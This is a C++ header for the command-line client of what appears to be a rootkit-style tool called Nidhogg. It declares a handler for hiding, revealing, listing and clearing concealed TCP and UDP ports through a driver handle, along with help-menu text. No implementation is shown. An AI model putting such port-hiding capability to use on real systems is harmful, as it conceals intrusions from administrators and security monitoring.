#pragma once
#include "pch.h"
#include "CommandHandler.h"

class NetworkHandler : public CommandHandler {
private:
	bool Hide(_In_ USHORT portNumber, _In_ PortType portType, _In_ bool remote, _In_ bool hide);
	std::vector<HiddenPort> ListHiddenPorts();
	bool ClearHiddenPorts();
	bool CheckInput(_In_ const std::vector<std::string>& params);

public:
	NetworkHandler(_In_ std::shared_ptr<HANDLE> hNidhogg) : CommandHandler("Network", hNidhogg) {};

	void PrintHelp() override {
		std::cout << termcolor::bright_magenta << termcolor::underline << "Options:" << termcolor::reset << std::endl;
		std::cout << termcolor::bright_magenta << "\t[*] " << termcolor::reset << "exit - Exit the program" << std::endl;
		std::cout << termcolor::bright_magenta << "\t[*] " << termcolor::reset << "back - Go back to the main menu" << std::endl;
		std::cout << termcolor::bright_magenta << "\t[*] " << termcolor::reset << "hide [port number] [tcp/udp] [remote/local] - Hide a port" << std::endl;
		std::cout << termcolor::bright_magenta << "\t[*] " << termcolor::reset << "[unhide | restore] [port number] [tcp/udp] [remote/local] - Revealing a port after hiding it" << std::endl;
		std::cout << termcolor::bright_magenta << "\t[*] " << termcolor::reset << "list - Listing the currently hidden ports" << std::endl;
		std::cout << termcolor::bright_magenta << "\t[*] " << termcolor::reset << "clear - Clear all hidden ports" << std::endl;
	}

	void HandleCommand(_In_ std::string command) override;
};

